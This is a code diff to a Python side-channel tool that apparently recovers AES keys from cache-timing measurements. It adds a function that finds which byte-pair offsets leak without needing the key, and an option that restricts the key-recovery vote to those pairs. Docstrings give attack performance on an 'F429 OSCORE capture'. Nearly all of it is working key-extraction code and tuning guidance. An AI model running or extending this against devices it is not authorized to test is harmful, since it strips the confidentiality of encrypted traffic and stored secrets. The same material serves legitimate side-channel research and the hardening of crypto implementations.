@@ -116,12 +116,54 @@ def _roundkey_to_master(rkbytes, direction, keysize):
     return None                                      # 192/256: single round key insufficient
 
 
+def leaking_offsets(known_blocks, timing, *, direction="enc", line_shift=4,
+                    margin=1.0):
+    """Which byte offsets carry the collision channel -- **without the key**.
+
+    Only some pairs of output bytes can collide in a cache line; on AES-128 with
+    a 16-byte-line S-box it is the offset-3 family. Every other pair contributes
+    nothing but noise to the vote, and there are 104 of those against 16 real
+    ones, so knowing which is which is worth a lot (see `recover(pair_offsets=)`).
+
+    The peak of a pair's score surface is a max over 65536 cells, so pure noise
+    still reads about 4.2 sigma and no single pair is conclusive. Averaging the
+    peak over the 16 pairs that share an offset separates them cleanly: on the
+    F429 OSCORE capture offset 3 reads 6.40 against 4.2-4.4 for all others.
+
+    Returns (offsets, peaks): the offsets standing `margin` sigma above the
+    median, and the full {offset: mean peak} map. Needs more traces than the
+    attack itself (about 450 k where the attack needs 200 k), which is why it is
+    normally done once on a device the attacker owns -- it is a property of the
+    library and the part, not of the key.
+    """
+    known = np.asarray(known_blocks, np.int64)
+    y = np.asarray(timing, float); y = y - y.mean()
+    tbl = SINV if direction == "enc" else SBOX
+    by = {}
+    for a in range(16):
+        for b in range(a + 1, 16):
+            d = min((b - a) % 16, (a - b) % 16)
+            by.setdefault(d, []).append(
+                col_attack_scored(known[:, a], known[:, b], y, tbl, line_shift)[2])
+    peaks = {d: float(np.mean(v)) for d, v in by.items()}
+    base = float(np.median(list(peaks.values())))
+    return sorted(d for d, v in peaks.items() if v > base + margin), peaks
+
+
 def recover(known_blocks, timing, *, direction="enc", keysize=128, line_shift=4,
-            verify=None, cand_per_pos=4, max_bruteforce=6, truth=None, log=None):
+            verify=None, cand_per_pos=4, max_bruteforce=6, truth=None, log=None,
+            pair_offsets=None):
     """Recover the key from (known block-cipher output blocks, timing).
 
     known_blocks : (N,16) uint8 -- the AES *output* block the attacker knows.
     timing       : (N,) float   -- per-trace timing (any monotone oracle).
+    pair_offsets : restrict the vote to byte pairs this far apart (mod 16).
+                   Default None scans all 120 pairs. Passing the offsets that
+                   actually leak -- see `leaking_offsets`, which finds them
+                   without the key -- drops the 104 noise pairs from the vote
+                   and is worth a large fraction of the trace count: on the
+                   F429 OSCORE capture the vote goes 11/16 -> 15/16 at 250 k,
+                   and the scan is 7x faster for scanning 16 pairs not 120.
     verify       : optional (pt, ct) bytes pair under the target key; enables
                    verification + brute-force of low-confidence bytes.
     truth        : optional true round key bytes, for validation only.
@@ -133,6 +175,9 @@ def recover(known_blocks, timing, *, direction="enc", keysize=128, line_shift=4,
     votes = np.zeros((16, 256))
     for a in range(16):
         for b in range(a + 1, 16):
+            if (pair_offsets is not None
+                    and min((b - a) % 16, (a - b) % 16) not in pair_offsets):
+                continue
             ga, gb, mg = col_attack_scored(known[:, a], known[:, b], y, tbl, line_shift)
             if mg > 0:
                 votes[a, ga] += mg
